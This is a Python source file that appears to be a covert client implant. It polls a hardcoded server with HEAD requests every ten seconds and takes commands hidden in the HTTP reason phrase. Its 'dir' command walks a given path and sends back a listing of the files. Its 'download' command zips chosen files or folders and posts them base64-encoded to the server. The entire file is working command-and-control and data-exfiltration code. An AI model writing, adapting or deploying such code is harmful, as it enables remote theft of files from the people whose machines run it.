import base64
import threading
import http.client
import time
import zipfile
import os
import pathlib
import ast
import sys

# TEMP_ZIP_PATH = r'C:\Users\<username>\AppData\Local\Temp\payload.zip' # change the username
TEMP_ZIP_PATH = 'payload.zip'
# TEMP_DIR_LIST_PATH = r'C:\Users\Tom\AppData\Local\Temp\dirlist.txt'
TEMP_DIR_LIST_PATH = 'dirlist.txt'
INTERVAL = 10


class Client:

    def __init__(self, server_ip, port):
        self.server_ip = server_ip
        self.port = port

    def keep_alive(self):
        """ send HEAD request and listen for commands"""
        while True:
            try:
                session = http.client.HTTPConnection(f'{self.server_ip}:{self.port}')
                session.request('HEAD', '/')
                response = session.getresponse()
                if response.reason != '':
                    # if command was given
                    try:
                        response.reason = ast.literal_eval(response.reason)
                        command = response.reason[0]
                        command_args = response.reason[1:]
                        if command_args:
                            self.handle_command(session, command, command_args)

                    except (ValueError, SyntaxError):
                        print('error')
                        command = response.reason
                        self.handle_command(session, command)
                session.close()
                time.sleep(INTERVAL)
            except ConnectionRefusedError:
                sys.exit(0)

    def handle_command(self, session, command, command_args=[]):
        """
        handle command properly
        :param session: HTTPConnection
        :param command: string
        :param command_args: list
        """
        if command_args:
            if command == 'download':
                self.upload(session, command_args)
            if command == 'dir':
                self.send_dirlist(session, command_args[0])

    def post(self, session, command, data):
        """
        sends POST request with the data
        :param session: HTTPConnection
        :param command: string - the path of the POST request
        :param data: bytes
        """
        encode_string = base64.b64encode(data)
        session.request('POST', command, body=encode_string)

    def send_dirlist(self, session, command_arg):
        """
        make the dirlist file and send to server
        :param session: HTTPConnection
        :param command_arg: string
        """
        self.make_dirlist_file(command_arg)
        with open(TEMP_DIR_LIST_PATH, 'rb') as f:
            self.post(session, 'dir', f.read())

    def make_dirlist_file(self, command_arg):
        """
        make the dirlist file with all subdirectories and files of given path
        :param command_arg: string
        """
        with open(TEMP_DIR_LIST_PATH, 'w') as f:
            for dirname, dirnames, filenames in os.walk(command_arg):
                for subdirname in dirnames:
                    f.write(f'{os.path.join(dirname, subdirname)}\n')
                for filename in filenames:
                    f.write(f'{os.path.join(dirname, filename)}\n')

    def upload(self, session, args):
        """
        upload the zipfile to the server
        :param session: HTTPConnection
        :param args: list of strings
        """
        self.payload_zip(args)
        with open(TEMP_ZIP_PATH, mode='rb') as payload:
            self.post(session, 'download', payload.read())

    def payload_zip(self, args):
        """
        create the payload zip file
        :param args: list of strings
        """
        with zipfile.ZipFile(TEMP_ZIP_PATH, mode='w', compression=zipfile.ZIP_DEFLATED) as zipf:
            for path in args:
                if os.path.isdir(path):
                    # path is a directory
                    self.zip_dir(path, zipf)
                else:
                    # path is a file
                    zipf.write(path)

    def zip_dir(self, root, zipf):
        """
        zip directory in the given zip file
        :param root: string
        :param zipf: ZipFile object
        """
        for path, subdirs, files in os.walk(root):
            for file in files:
                zipf.write(pathlib.PurePath(path, file))


def main():
    client = Client('192.168.221.1', '80')
    t = threading.Thread(target=client.keep_alive)
    t.start()


if __name__ == '__main__':
    main()
